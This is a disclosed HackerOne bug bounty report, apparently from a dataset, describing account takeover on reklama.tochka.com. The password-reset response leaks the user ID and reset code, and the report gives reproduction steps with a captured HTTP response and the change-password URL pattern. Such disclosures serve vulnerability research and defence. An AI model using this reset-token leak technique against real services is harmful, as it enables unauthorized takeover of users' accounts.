---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1379842'
original_report_id: '1379842'
title: account takeover through password reset in url https://reklama.tochka.com/
weakness: Improper Authentication - Generic
team_handle: qiwi
created_at: '2021-10-24T21:39:41.706Z'
disclosed_at: '2021-12-02T12:58:57.504Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 57
asset_identifier: '*.tochka.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- improper-authentication-generic
---

# account takeover through password reset in url https://reklama.tochka.com/

## Metadata

- HackerOne Report ID: 1379842
- Weakness: Improper Authentication - Generic
- Program: qiwi
- Disclosed At: 2021-12-02T12:58:57.504Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

#Steps to reproduce
1- Create an account
2- visit this url https://reklama.tochka.com/mainpage1/recover/
2- Enter your email and intercept the response to the request that recovers your password

you will notice that it looks like this

```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 24 Oct 2021 21:32:20 GMT
Content-Type: application/json
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.3.28
Cache-Control: no-cache, private
Access-Control-Allow-Origin: https://reklama.tochka.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: content-type
Set-Cookie: challenge-token=deleted; expires=Sat, 24-Oct-2020 21:32:19 GMT; Max-Age=0; path=/; domain=preview-new-project.aori.vn; secure; samesite=strict
Set-Cookie: aori_no_tracking_extended=0; expires=Mon, 24-Oct-2022 21:32:20 GMT; Max-Age=31536000; path=/; domain=preview-new-project.aori.vn; secure; samesite=strict
Set-Cookie: challenge-token=deleted; expires=Sat, 24-Oct-2020 21:32:19 GMT; Max-Age=0; path=/; secure; samesite=strict
Access-Control: allow
Cache-Control: no-store
Cache-Control: must-revalidate
Cache-Control: post-check=0
Cache-Control: pre-check=0
Pragma: no-cache
Content-Length: 413

{"message":"\u041c\u044b \u043e\u0442\u043f\u0440\u0430\u0432\u0438\u043b\u0438 \u0438\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0438 \u043f\u043e \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u044e \u043d\u0430 \u0432\u0430\u0448 \u043f\u043e\u0447\u0442\u043e\u0432\u044b\u0439 \u044f\u0449\u0438\u043a","user_id":YOUR_ID,"code":"YOUR_CODE"}
```

Now go to https://reklama.tochka.com/mainpage1/change-password/id/code

replace the id with the one you get in the response and replace the code with the one you get in the response

## Impact

account takeover

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
